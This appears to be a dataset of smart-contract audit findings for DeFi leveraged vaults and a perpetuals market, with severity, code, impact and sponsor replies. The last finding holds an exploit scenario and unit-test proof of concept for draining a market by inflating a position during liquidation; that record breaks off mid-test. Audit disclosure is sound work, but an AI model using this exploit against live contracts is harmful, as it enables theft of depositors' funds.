Incorrect Spot Priceчhighч```\nuint256 b = Math.mul(invariant, a).sub(invariant);\n```\nчMultiple discrepancies between the implementation of Leverage Vault's `_calcSpotPrice` function and SDK were observed, which indicate that the computed spot price is incorrect.\nIf the spot price is incorrect, it might potentially fail to detect the pool has been manipulated. In the worst-case scenario, the trade proceeds to execute against the manipulated pool, leading to a loss of assets.\nThe `BalancerSpotPrice._calculateStableMathSpotPrice` function relies on the `StableMath._calcSpotPrice` to compute the spot price of two tokens.\nOn a high level, the spot price is computed by determining the pool derivatives. The Balancer SDK's provide a feature to compute the spot price of any two tokens within a pool, and it leverages the `_poolDerivatives` function.\nThe existing function for computing the spot price of any two tokens of a composable pool has the following errors or discrepancies from the approach used to compute the spot price in Balancer SDK, which might lead to an inaccurate spot price being computed.\nInstance 1\nThe comments and SDK add `b.y` and `b.x` to the numerator and denominator, respectively, in the formula. However, the code performs a subtraction.\nInstance 2\nPer the comment and SDK code, $b = (S - D) a + D$.\nHowever, assuming that $S$ is zero (for a two-token pool), the following code in the Leverage Vault to compute $b$ is not equivalent to the above.\n```\nuint256 b = Math.mul(invariant, a).sub(invariant);\n```\n\nInstance 3\nThe $S$ in the code will always be zero because the code is catered only for two-token pools. However, for a composable pool, it can support up to five (5) tokens in a pool. $S$ should be as follows, where $balances$ is all the tokens in a composable pool except for BPT.\n$$ S = \sum_{i \neq \text{tokenIndexIn}, i \neq \text{tokenIndexOut}} \text{balances}[i] $$\nInstance 4\nThe amplification factor is scaled by `A * 2` in the code, while the SDK scaled it by `A * 2^2` (ATimesNpowN). https://github.com/balancer/balancer-sor/blob/73d6b435c1429bbfc199b39b38a36e581838d2c3/src/pools/stablePool/stableMath.ts#L235C63-L235C74\nInstance 5\nPer SDK, the amplification factor is scaled down by $n^{(n - 1)}$ where $n$ is the number of tokens in a composable pool (excluding BPT). Otherwise, this was not implemented within the code.чGiven multiple discrepancies between the implementation of Leverage Vault's `_calcSpotPrice` function and SDK and due to the lack of information on the web, it is recommended to reach out to the Balancer's protocol team to identify the actual formula used to determine a spot price of any two tokens within a composable pool and check out if the formula in the SDK is up-to-date to be used against the composable pool.\nIt is also recommended to implement additional tests to ensure that the `_calcSpotPrice` returns the correct spot price of composable pools.\nIn addition, the `StableMath._calcSpotPrice` function is no longer used or found within the current version of Balancer's composable pool. Thus, there is no guarantee that the math within the `StableMath._calcSpotPrice` works with the current implementation. It is recommended to use the existing method in the current Composable Pool's StableMath, such as `_calcOutGivenIn` (ensure the fee is excluded) to compute the spot price.\nDiscussion\njeffywu\nCan confirm that this code no longer exists in the latest version of StableMath for the new ComposableStablePool, currently confirming with the Balancer team on how to approach this.\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/63чThe spot price is used to verify if the pool has been manipulated before executing certain key vault actions (e.g. reinvest rewards). If the spot price is incorrect, it might potentially fail to detect the pool has been manipulated or result in unintended reverts due to false positives. In the worst-case scenario, the trade proceeds to execute against the manipulated pool, leading to a loss of assets.\nCode Snippet\nTool used\nManual Review
Incorrect invariant used for Balancer's composable poolsчhighч```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256)\n{\n    /**********************************************************************************************\n    // invariant                                                                                 //\n    // D = invariant                                                  D^(n+1)                    //\n    // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n    // S = sum of balances                                             n^n P                     //\n    // P = product of balances                                                                   //\n    // n = number of tokens                                                                      //\n    **********************************************************************************************/\n```\nчOnly two balances instead of all balances were used when computing the invariant for Balancer's composable pools, which is incorrect. As a result, pool manipulation might not be detected. This could lead to the transaction being executed on the manipulated pool, resulting in a loss of assets.\nA composable pool can support up to 5 tokens (excluding the BPT). When computing the invariant for a composable pool, one needs to pass in the balances of all the tokens within the pool except for BPT. However, the existing code always only passes in the balance of two tokens, which will return an incorrect invariant if the composable pool supports more than two tokens.\nFollowing is the formula for computing the invariant of a composable pool taken from Balancer's Composable Pool. The `balances` passed into this function consist of all `balances` except for BPT (Reference)\n```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256)\n{\n    /**********************************************************************************************\n    // invariant                                                                                 //\n    // D = invariant                                                  D^(n+1)                    //\n    // A = amplification coefficient      A  n^n S + D = A D n^n + -----------                   //\n    // S = sum of balances                                             n^n P                     //\n    // P = product of balances                                                                   //\n    // n = number of tokens                                                                      //\n    **********************************************************************************************/\n```\n\nThe Balancer SDK's provide a feature to compute the spot price of any two tokens within a pool (https://github.com/balancer/balancer-sdk/blob/develop/balancer-js/src/modules/pools/pool-types/concerns/stablePhantom/spotPrice.spec.ts). By tracing the functions, it eventually triggers the following `_poolDerivatives` function.\nWithin the `_poolDerivatives` function, the `balances` used to compute the invariant consist of the balance of all tokens in the pool, except for BPT, which is aligned with the earlier understanding.\nhttps://github.com/balancer/balancer-sor/blob/73d6b435c1429bbfc199b39b38a36e581838d2c3/src/pools/phantomStablePool/phantomStableMath.ts#L516\n```\nexport function _poolDerivatives(\n    A: BigNumber,\n    balances: OldBigNumber[],\n    tokenIndexIn: number,\n    tokenIndexOut: number,\n    is_first_derivative: boolean,\n    wrt_out: boolean\n): OldBigNumber {\n    const totalCoins = balances.length;\n    const D = _invariant(A, balances);\n```\n\nNote: Composable Pool used to be called Phantom Pool in the past (https://medium.com/balancer-protocol/rate-manipulation-in-balancer-boosted-pools-technical-postmortem-53db4b642492)чReview if there is any specific reason for passing in only the balance of two tokens when computing the invariant. Otherwise, the balance of all tokens (except BPT) should be used to compute the invariant.\nIn addition, it is recommended to include additional tests to ensure that the computed spot price is aligned with the market price.\nDiscussion\njeffywu\nThis looks to be valid and we can re-align our implementation to match the balancer implementation.\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/63чAn incorrect invariant will lead to an incorrect spot price being computed. The spot price is used within the `_checkPriceAndCalculateValue` function that is intended to revert if the spot price on the pool is not within some deviation tolerance of the implied oracle price to prevent any pool manipulation. As a result, incorrect spot price leads to false positives or false negatives, where, in the worst-case scenario, pool manipulation was not caught by this function, and the transaction proceeded to be executed.\nThe `_checkPriceAndCalculateValue` function was found to be used within the following functions:\n`reinvestReward` - If the `_checkPriceAndCalculateValue` function is malfunctioning, it will cause the vault to add liquidity into a pool that has been manipulated, leading to a loss of assets.\n`convertStrategyToUnderlying` - This function is used by Notional V3 for the purpose of computing the collateral values and the account's health factor. If the `_checkPriceAndCalculateValue` function reverts unexpectedly due to an incorrect invariant/spot price, many of Notional's core functions will break. In addition, the collateral values and the account's health factor might be inflated if it fails to detect a manipulated pool due to incorrect invariant/spot price, potentially allowing the malicious actors to drain the main protocol.\nCode Snippet\nTool used\nManual Review
Unable to reinvest if the reward token equals one of the pool tokensчhighч```\ntokens[0] = crvUSD\ntokens[1] = WETH\ntokens[2] = CRV\n```\nчIf the reward token is the same as one of the pool tokens, the protocol would not be able to reinvest such a reward token. Thus leading to a loss of assets for the vault shareholders.\nDuring the reinvestment process, the `reinvestReward` function will be executed once for each reward token. The length of the `trades` listing defined in the payload must be the same as the number of tokens in the pool per Line 339 below.\nIn addition, due to the requirement at Line 105, each element in the `trades` listing must be a token within a pool and must be ordered in sequence according to the token index of the pool.\nAssuming the TriCRV Curve pool (crvUSD+WETH+CRV) has two reward tokens (CRV & CVX). This example is taken from a live Curve pool on Ethereum (Reference 1 Reference 2)\nThe pool will consist of the following tokens:\n```\ntokens[0] = crvUSD\ntokens[1] = WETH\ntokens[2] = CRV\n```\n\nThus, if the protocol receives 3000 CVX reward tokens and it intends to sell 1000 CVX for crvUSD and 1000 CVX for WETH.\nThe `trades` list has to be defined as below.\n```\ntrades[0].sellToken[0] = CRV (rewardToken) | trades[0].buyToken = crvUSD | trades[0].amount = 1000\ntrades[1].sellToken[1] = CRV (rewardToken) | trades[1].buyToken = WETH    | trades[0].amount = 1000\ntrades[1].sellToken[2] = CRV (rewardToken) | trades[1].buyToken = CRV    | trades[0].amount = 0\n```\n\nThe same issue also affects the Balancer pools. Thus, the example is omitted for brevity. One of the affected Balancer pools is as follows, where the reward token is also one of the pool tokens.\nWETH-AURA - Reference 1 Reference 2 (Reward Tokens = [BAL, AURA])\nHowever, the issue is that the `_isInvalidRewardToken` function within the `_executeRewardTrades` will always revert.\nThe reason is that within the `_isInvalidRewardToken` function it checks if the reward token to be sold is any of the pool tokens. In this case, the condition will be evaluated to be true, and a revert will occur. As a result, the protocol would not be able to reinvest such reward tokens.чConsider tracking the number of pool tokens received during an emergency exit, and segregate these tokens with the reward tokens. For instance, the vault has 3000 CVX, 1000 of them are received during the emergency exit, while the rest are reward tokens emitted from Convex/Aura. In this case, the protocol can sell all CVX on the vault except for the 1000 CVX reserved.\nDiscussion\njeffywu\nFair point, we will need to make some accommodations in these cases.\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/73чThe reinvestment of reward tokens is a critical component of the vault. The value per vault share increases when reward tokens are sold for the pool tokens and reinvested back into the Curve/Balancer pool to obtain more LP tokens. If this feature does not work as intended, it will lead to a loss of assets for the vault shareholders.\nCode Snippet\nTool used\nManual Review
Native ETH not received when removing liquidity from Curve V2 poolsчhighч"```\n@external\n@nonreentrant('lock')\ndef remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256,\n                              use_eth: bool = False, receiver: address = msg.sender) -> uint256:\n    A_gamma: uint256[2] = self._A_gamma()\n\n    dy: uint256 = 0\n    D: uint256 = 0\n    p: uint256 = 0\n    xp: uint256[N_COINS] = empty(uint256[N_COINS])\n    future_A_gamma_time: uint256 = self.future_A_gamma_time\n    dy, p, D, xp = self._calc_withdraw_one_coin(A_gamma, token_amount, i, (future_A_gamma_time > 0), True)\n    assert dy >= min_amount, ""Slippage""\n\n    if block.timestamp >= future_A_gamma_time:\n        self.future_A_gamma_time = 1\n\n    self.balances[i] -= dy\n    CurveToken(self.token).burnFrom(msg.sender, token_amount)\n\n    coin: address = self.coins[i]\n    if use_eth and coin == WETH20:\n        raw_call(receiver, b"""", value=dy)\n    else:\n        if coin == WETH20:\n            WETH(WETH20).deposit(value=dy)\n        response: Bytes[32] = raw_call(\n            coin,\n            _abi_encode(receiver, dy, method_id=method_id(""transfer(address,uint256)"")),\n            max_outsize=32,\n        )\n        if len(response) != 0:\n            assert convert(response, bool)\n```\n"ч"Native ETH was not received when removing liquidity from Curve V2 pools due to the mishandling of Native ETH and WETH, leading to a loss of assets.\nCurve V2 pool will always wrap to WETH and send to leverage vault unless the `use_eth` is explicitly set to `True`. Otherwise, it will default to `False`. The following implementation of the `remove_liquidity_one_coin` function taken from one of the Curve V2 pools shows that unless the `use_eth` is set to `True`, the `WETH.deposit()` will be triggered to wrap the ETH, and WETH will be transferred back to the caller. The same is true for the `remove_liquidity` function, but it is omitted for brevity.\nhttps://etherscan.io/address/0x0f3159811670c117c372428d4e69ac32325e4d0f#code\n```\n@external\n@nonreentrant('lock')\ndef remove_liquidity_one_coin(token_amount: uint256, i: uint256, min_amount: uint256,\n                              use_eth: bool = False, receiver: address = msg.sender) -> uint256:\n    A_gamma: uint256[2] = self._A_gamma()\n\n    dy: uint256 = 0\n    D: uint256 = 0\n    p: uint256 = 0\n    xp: uint256[N_COINS] = empty(uint256[N_COINS])\n    future_A_gamma_time: uint256 = self.future_A_gamma_time\n    dy, p, D, xp = self._calc_withdraw_one_coin(A_gamma, token_amount, i, (future_A_gamma_time > 0), True)\n    assert dy >= min_amount, ""Slippage""\n\n    if block.timestamp >= future_A_gamma_time:\n        self.future_A_gamma_time = 1\n\n    self.balances[i] -= dy\n    CurveToken(self.token).burnFrom(msg.sender, token_amount)\n\n    coin: address = self.coins[i]\n    if use_eth and coin == WETH20:\n        raw_call(receiver, b"""", value=dy)\n    else:\n        if coin == WETH20:\n            WETH(WETH20).deposit(value=dy)\n        response: Bytes[32] = raw_call(\n            coin,\n            _abi_encode(receiver, dy, method_id=method_id(""transfer(address,uint256)"")),\n            max_outsize=32,\n        )\n        if len(response) != 0:\n            assert convert(response, bool)\n```\n\nNotional's Leverage Vault only works with Native ETH. It was found that the `remove_liquidity_one_coin` and `remove_liquidity` functions are executed without explicitly setting the `use_eth` parameter to `True`. Thus, WETH instead of Native ETH will be returned during remove liquidity. As a result, these WETH will not be accounted for in the vault and result in a loss of assets."чIf one of the pool tokens is ETH, consider setting `is_eth` to true when calling `remove_liquidity_one_coin` and `remove_liquidity` functions to ensure that Native ETH is sent back to the vault.\nDiscussion\njeffywu\nAs I recall, this flag only exists on CurveV2 pools?\njeffywu\nhttps://github.com/notional-finance/leveraged-vaults/pull/71чFollowing are some of the impacts due to the mishandling of Native ETH and WETH during liquidity removal in Curve pools, leading to loss of assets:\nCode Snippet\nTool used\nManual Review
reinvestReward() generates dust totalPoolClaim causing vault abnormalчmediumч```\n    function _mintVaultShares(uint256 lpTokens) internal returns (uint256 vaultShares) {\n        StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n        if (state.totalPoolClaim == 0) {\n            // Vault Shares are in 8 decimal precision\n          vaultShares = (lpTokens * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / POOL_PRECISION();\n        } else {\n            vaultShares = (lpTokens * state.totalVaultSharesGlobal) / state.totalPoolClaim;\n        }\n\n        // Updates internal storage here\n        state.totalPoolClaim += lpTokens;\n        state.totalVaultSharesGlobal += vaultShares.toUint80();\n        state.setStrategyVaultState();\n```\nч"If the first user deposits too small , due to the round down, it may result in 0 shares, which will result in 0 shares no matter how much is deposited later. In `National`, this situation will be prevented by setting `a minimum borrow size and a minimum leverage ratio`. However, `reinvestReward()` does not have this restriction, which may cause this problem to still exist, causing the vault to enter an abnormal state.\nThe calculation of the shares of the vault is as follows:\n```\n    function _mintVaultShares(uint256 lpTokens) internal returns (uint256 vaultShares) {\n        StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n        if (state.totalPoolClaim == 0) {\n            // Vault Shares are in 8 decimal precision\n          vaultShares = (lpTokens * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / POOL_PRECISION();\n        } else {\n            vaultShares = (lpTokens * state.totalVaultSharesGlobal) / state.totalPoolClaim;\n        }\n\n        // Updates internal storage here\n        state.totalPoolClaim += lpTokens;\n        state.totalVaultSharesGlobal += vaultShares.toUint80();\n        state.setStrategyVaultState();\n```\n\nIf the first `deposit` is too small, due to the conversion to `INTERNAL_TOKEN_PRECISION`, the precision is lost, resulting in `vaultShares=0`. Subsequent depositors will enter the second calculation, but `totalVaultSharesGlobal=0`, so `vaultShares` will always be `0`.\nTo avoid this situation, `Notional` has restrictions.\nhey guys, just to clarify some rounding issues stuff on vault shares and the precision loss. Notional will enforce a minimum borrow size and a minimum leverage ratio on users which will essentially force their initial deposits to be in excess of any dust amount. so we should not really see any tiny deposits that result in rounding down to zero vault shares. If there was rounding down to zero, the account will likely fail their collateral check as the vault shares act as collateral and the would have none. there is the possibility of a dust amount entering into depositFromNotional in a valid state, that would be due to an account ""rolling"" a position from one debt maturity to another. in this case, a small excess amount of deposit may come into the vault but the account would still be forced to be holding a sizeable position overall due to the minium borrow size.\nin `reinvestReward()`, not this limit\n```\n    function reinvestReward(\n        SingleSidedRewardTradeParams[] calldata trades,\n        uint256 minPoolClaim\n    ) external whenNotLocked onlyRole(REWARD_REINVESTMENT_ROLE) returns (\n        address rewardToken,\n        uint256 amountSold,\n        uint256 poolClaimAmount\n    ) {\n        // Will revert if spot prices are not in line with the oracle values\n        _checkPriceAndCalculateValue();\n\n        // Require one trade per token, if we do not want to buy any tokens at a\n        // given index then the amount should be set to zero. This applies to pool\n        // tokens like in the ComposableStablePool.\n        require(trades.length == NUM_TOKENS());\n        uint256[] memory amounts;\n        (rewardToken, amountSold, amounts) = _executeRewardTrades(trades);\n\n        poolClaimAmount = _joinPoolAndStake(amounts, minPoolClaim);\n\n        // Increase LP token amount without minting additional vault shares\n        StrategyVaultState memory state = VaultStorage.getStrategyVaultState();\n      state.totalPoolClaim += poolClaimAmount;\n        state.setStrategyVaultState();\n\n        emit RewardReinvested(rewardToken, amountSold, poolClaimAmount);\n    }\n```\n\nFrom the above code, we know that `reinvestReward()` will increase `totalPoolClaim`, but will not increase `totalVaultSharesGlobal`.\nThis will cause problems in the following scenarios:\nThe current vault has deposits.\n`Rewards` have been generated, but `reinvestReward()` has not been executed.\nThe `bot` submitted the `reinvestReward()` transaction. but step 4 execute first\nThe users took away all the deposits `totalPoolClaim = 0`, `totalVaultSharesGlobal=0`.\nAt this time `reinvestReward()` is executed, then `totalPoolClaim > 0`, `totalVaultSharesGlobal=0`.\nOther users' deposits will fail later\nIt is recommended that `reinvestReward()` add a judgment of `totalVaultSharesGlobal>0`.\nNote: If there is a malicious REWARD_REINVESTMENT_ROLE, it can provoke this issue by donating reward token and triggering reinvestReward() before the first depositor appears."ч"
ETH can be sold during reinvestmentчmediumч```\naddress internal constant ALT_ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n```\nчThe existing control to prevent ETH from being sold during reinvestment can be bypassed, allowing the bots to accidentally or maliciously sell off the non-reward assets of the vault.\nMultiple instances of this issue were found:\nInstance 1 - Curve's Implementation\nThe `_isInvalidRewardToken` function attempts to prevent the callers from selling away ETH during reinvestment.\nHowever, the code at Line 67 above will not achieve the intended outcome as `Deployments.ALT_ETH_ADDRESS` is not a valid token address in the first place.\n```\naddress internal constant ALT_ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n```\n\nWhen the caller is executing a trade with ETH, the address for ETH used is either `Deployments.WETH` or `Deployments.ETH_ADDRESS` (address(0)) as shown in the TradingUtils's source code, not the `Deployments.ALT_ETH_ADDRESS`.\nAs a result, the caller (bot) of the reinvestment function could still sell off the ETH from the vault, bypassing the requirement.\nInstance 2 - Balancer's Implementation\nWhen the caller is executing a trade with ETH, the address for ETH used is either `Deployments.WETH` or `Deployments.ETH_ADDRESS` (address(0)), as mentioned earlier. However, the `AuraStakingMixin._isInvalidRewardToken` function only blocks `Deployments.WETH` but not `Deployments.ETH`, thus allowing the caller (bot) of the reinvestment function, could still sell off the ETH from the vault, bypassing the requirement.\nPer the sponsor's clarification below, the contracts should protect against the bot doing unintended things (including acting maliciously) due to coding errors, which is one of the main reasons for having the `_isInvalidRewardToken` function. Thus, this issue is a valid bug in the context of this audit contest.\nhttps://discord.com/channels/812037309376495636/1175450365395751023/1175781082336067655\nч
Leverage Vault on sidechains that support Curve V2 pools is brokenчmediumч"```\ndef add_liquidity(\n    amounts: uint256[N_COINS],\n    min_mint_amount: uint256,\n    use_eth: bool = False,\n    receiver: address = msg.sender\n) -> uint256:\n    """"""\n    @notice Adds liquidity into the pool.\n    @param amounts Amounts of each coin to add.\n    @param min_mint_amount Minimum amount of LP to mint.\n    @param use_eth True if native token is being added to the pool.\n    @param receiver Address to send the LP tokens to. Default is msg.sender\n    @return uint256 Amount of LP tokens received by the `receiver\n    """"""\n..SNIP..\n    # --------------------- Get prices, balances -----------------------------\n..SNIP..\n    # -------------------------------------- Update balances and calculate xp.\n..SNIP// rest of code\n    # ---------------- transferFrom token into the pool ----------------------\n\n    for i in range(N_COINS):\n\n        if amounts[i] > 0:\n\n            if coins[i] == WETH20:\n\n                self._transfer_in(\n                    coins[i],\n                    amounts[i],\n                    0,  # <-----------------------------------\n                    msg.value,  #                             | No callbacks\n                    empty(address),  # <----------------------| for\n                    empty(bytes32),  # <----------------------| add_liquidity.\n                    msg.sender,  #                            |\n                    empty(address),  # <-----------------------\n                    use_eth\n                )\n```\n"ч"No users will be able to deposit to the Leverage Vault on Arbitrum and Optimism that supports Curve V2 pools, leading to the core contract functionality of a vault being broken and a loss of revenue for the protocol.\nFollowing are examples of some Curve V2 pools in Arbitum:\nfETH/ETH/xETH (https://curve.fi/#/arbitrum/pools/factory-tricrypto-2/deposit)\ntricrypto (https://curve.fi/#/arbitrum/pools/tricrypto/deposit)\neursusd (https://curve.fi/#/arbitrum/pools/eursusd/deposit)\nThe code from Line 64 to Line 71 is only executed if the contract resides on Ethereum. As a result, for Arbitrum and Optimism sidechains, the `IS_CURVE_V2` variable is always false.\nAs a result, code within the `_joinPoolAndStake` function will always call the Curve V1's `add_liquidity` function that does not define the `use_eth` parameter.\nIf the `use_eth` parameter is not defined, it will default to `False`. As a result, the Curve pool expects the caller to transfer over the WETH to the pool and the pool will call `WETH.withdraw` to unwrap the WETH to Native ETH as shown in the code below.\nHowever, Notional's leverage vault only works with Native ETH, and if one of the pool tokens is WETH, it will explicitly convert the address to either the `Deployments.ALT_ETH_ADDRESS` (0xEeeee) or `Deployments.ETH_ADDRESS` (address(0)) during deployment and initialization.\nThe implementation of the above `_joinPoolAndStake` function will forward Native ETH to the Curve Pool, while the pool expects the vault to transfer in WETH. As a result, a revert will occur since the pool did not receive the WETH it required during the unwrap process.\nhttps://arbiscan.io/address/0xf7fed8ae0c5b78c19aadd68b700696933b0cefd9#code#L509 (Taken from Curve V2 fETH/ETH/xETH pool)\n```\ndef add_liquidity(\n    amounts: uint256[N_COINS],\n    min_mint_amount: uint256,\n    use_eth: bool = False,\n    receiver: address = msg.sender\n) -> uint256:\n    """"""\n    @notice Adds liquidity into the pool.\n    @param amounts Amounts of each coin to add.\n    @param min_mint_amount Minimum amount of LP to mint.\n    @param use_eth True if native token is being added to the pool.\n    @param receiver Address to send the LP tokens to. Default is msg.sender\n    @return uint256 Amount of LP tokens received by the `receiver\n    """"""\n..SNIP..\n    # --------------------- Get prices, balances -----------------------------\n..SNIP..\n    # -------------------------------------- Update balances and calculate xp.\n..SNIP// rest of code\n    # ---------------- transferFrom token into the pool ----------------------\n\n    for i in range(N_COINS):\n\n        if amounts[i] > 0:\n\n            if coins[i] == WETH20:\n\n                self._transfer_in(\n                    coins[i],\n                    amounts[i],\n                    0,  # <-----------------------------------\n                    msg.value,  #                             | No callbacks\n                    empty(address),  # <----------------------| for\n                    empty(bytes32),  # <----------------------| add_liquidity.\n                    msg.sender,  #                            |\n                    empty(address),  # <-----------------------\n                    use_eth\n                )\n```\n\n```\ndef _transfer_in(\n..SNIP..\n    use_eth: bool\n):\n..SNIP..\n    @params use_eth True if the transfer is ETH, False otherwise.\n    """"""\n\n    if use_eth and _coin == WETH20:\n        assert mvalue == dx  # dev: incorrect eth amount\n    else:\n..SNIP..\n        if _coin == WETH20:\n            WETH(WETH20).withdraw(dx)  # <--------- if WETH was transferred in\n            #           previous step and `not use_eth`, withdraw WETH to ETH.\n```\n"чEnsure the `IS_CURVE_V2` variable is initialized on the Arbitrum and Optimism side chains according to the Curve Pool's version.\nIf there is a limitation on the existing approach to determining a pool is V1 or V2 on Arbitrum and Optimsim, an alternative approach might be to use the presence of a `gamma()` function as an indicator of pool type\nDiscussion\njeffywu\nIt should be noted that none of the pools are available on Convex either: https://www.convexfinance.com/stake\nFurthermore, the Convex vault is only explicitly written for 2 token vaults, which the ones auditor listed are not. So therefore they could not be listed as structured Arbitrum in any case. I would range this as a medium severity, if anything.чNo users will be able to deposit to the Leverage Vault on Arbitrum and Optimism that supports Curve V2 pools. The deposit function is a core function of any vault. Thus, this issue breaks the core contract functionality of a vault.\nIn addition, if the affected vaults cannot be used, it leads to a loss of revenue for the protocol.\nCode Snippet\nTool used\nManual Review
Liquidator can liquidate user while increasing user position to any value, stealing all Market funds or bricking the contractчhighч```\nif (protected && (\n    !context.closable.isZero() || // @audit even if closable is 0, position can still increase\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n\nif (\n    !(context.currentPosition.local.magnitude().isZero() && context.latestPosition.local.magnitude().isZero()) &&   // sender has no position\n    !(newOrder.isEmpty() && collateral.gte(Fixed6Lib.ZERO)) &&                                                      // sender is depositing zero or more into account, without position change\n    (context.currentTimestamp - context.latestVersion.timestamp >= context.riskParameter.staleAfter)                // price is not stale\n) revert MarketStalePriceError();\n\nif (context.marketParameter.closed && newOrder.increasesPosition())\n    revert MarketClosedError();\n\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit))\n    revert MarketMakerOverLimitError();\n\nif (!newOrder.singleSided(context.currentPosition.local) || !newOrder.singleSided(context.latestPosition.local))\n    revert MarketNotSingleSidedError();\n\nif (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n```\nч"When a user is liquidated, there is a check to ensure that after liquidator order executes, `closable = 0`, but this actually doesn't prevent liquidator from increasing user position, and since all position size and collateral checks are skipped during liquidation, this allows malicious liquidator to open position of max possible size (2^62-1) during liquidation. Opening such huge position means the Market contract accounting is basically broken from this point without any ability to restore it. For example, the fee paid (and accumulated by makers) from opening such position will be higher than entire Market collateral balance, so any maker can withdraw full Market balance immediately after this position is settled.\n`closable` is the value calculated as the maximum possible position size that can be closed even if some pending position updates are invalidated due to invalid oracle version. For example:\nLatest position = 10\nPending position [t=200] = 0\nPending position [t=300] = 1000\nIn such scenario `closable = 0` (regardless of position size at t=300).\nWhen position is liquidated (called `protected` in the code), the following requirements are enforced in _invariant():\n```\nif (protected && (\n    !context.closable.isZero() || // @audit even if closable is 0, position can still increase\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        context.pendingCollateral.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n\nif (\n    !(context.currentPosition.local.magnitude().isZero() && context.latestPosition.local.magnitude().isZero()) &&   // sender has no position\n    !(newOrder.isEmpty() && collateral.gte(Fixed6Lib.ZERO)) &&                                                      // sender is depositing zero or more into account, without position change\n    (context.currentTimestamp - context.latestVersion.timestamp >= context.riskParameter.staleAfter)                // price is not stale\n) revert MarketStalePriceError();\n\nif (context.marketParameter.closed && newOrder.increasesPosition())\n    revert MarketClosedError();\n\nif (context.currentPosition.global.maker.gt(context.riskParameter.makerLimit))\n    revert MarketMakerOverLimitError();\n\nif (!newOrder.singleSided(context.currentPosition.local) || !newOrder.singleSided(context.latestPosition.local))\n    revert MarketNotSingleSidedError();\n\nif (protected) return; // The following invariants do not apply to protected position updates (liquidations)\n```\n\nThe requirements for liquidated positions are:\nclosable = 0, user position collateral is below maintenance, liquidator withdraws no more than liquidation fee\nmarket oracle price is not stale\nfor closed market - order doesn't increase position\nmaker position doesn't exceed maker limit\norder and position are single-sided\nAll the other invariants are skipped for liquidation, including checks for long or short position size and collateral.\nAs shown in the example above, it's possible for the user to have `closable = 0` while having the new (current) position size of any amount, which makes it possible to succesfully liquidate user while increasing the position size (long or short) to any amount (up to max `2^62-1` enforced when storing position size values).\nScenario for opening any position size (oracle granularity = 100): T=1: ETH price = $100. User opens position `long = 10` with collateral = min margin ($350) T=120: Oracle version T=100 is commited, price = $100, user position is settled (becomes latest) ... T=150: ETH price starts moving against the user, so the user tries to close the position calling `update(0,0,0,0,false)` T=205: Current price is $92 and user becomes liquidatable (before the T=200 price is commited, so his close request is still pending). Liquidator commits unrequested oracle version T=190, price = $92, user is liquidated while increasing his position: `update(0,2^62-1,0,0,true)` Liquidation succeeds, because user has latest `long = 10`, pending long = 0 (t=200), liquidation pending long = 2^62-1 (t=300). `closable = 0`.\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('liquidate with huge open position', async () => {\nconst positionMaker = parse6decimal('20.000')\nconst positionLong = parse6decimal('10.000')\nconst collateral = parse6decimal('1000')\nconst collateral2 = parse6decimal('350')\nconst maxPosition = parse6decimal('4611686018427') // 2^62-1\n\nconst oracleVersion = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP,\n    valid: true,\n}\noracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\noracle.status.returns([oracleVersion, TIMESTAMP + 100])\noracle.request.returns()\n\n// maker\ndsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\nawait market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)\n\n// user opens long=10\ndsu.transferFrom.whenCalledWith(user.address, market.address, collateral2.mul(1e12)).returns(true)\nawait market.connect(user).update(user.address, 0, positionLong, 0, collateral2, false)\n\nconst oracleVersion2 = {\n    price: parse6decimal('100'),\n    timestamp: TIMESTAMP + 100,\n    valid: true,\n}\noracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)\noracle.status.returns([oracleVersion2, TIMESTAMP + 200])\noracle.request.returns()\n\n// price moves against user, so he's at the edge of liquidation and tries to close\n// position: latest=10, pending [t=200] = 0 (closable = 0)\nawait market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\nconst oracleVersion3 = {\n    price: parse6decimal('92'),\n    timestamp: TIMESTAMP + 190,\n    valid: true,\n}\noracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)\noracle.status.returns([oracleVersion3, TIMESTAMP + 300])\noracle.request.returns()\n\nvar loc = await market.locals(user.address);\nvar posLatest = await market.positions(user.address);\nvar posCurrent = await market.pendingPositions(user.address, loc.currentId);\nconsole.log(""Before liquidation. Latest= "" + posLatest.long + "" current = "" + posCurrent.long);\n\n// t = 205: price drops to 92, user becomes liquidatable before the pending position oracle version is commited\n// liquidator commits unrequested price = 92 at oracle version=190, but current timestamp is already t=300\n// liquidate. User pending positions:\n//   latest = 10\n//   pending [t=200] = 0\n//   current(liquidated) [t=300] = max possible position (2^62-1)\nawait market.connect(user).update(user.address, 0, maxPosition, 0, 0, true)\n\nvar loc = await market.locals(user.address);\nvar posLatest = await market.positions(user.address);\nvar posCurrent = await market.pendingPositions(user.address, loc.currentId);\nconsole.log(""After 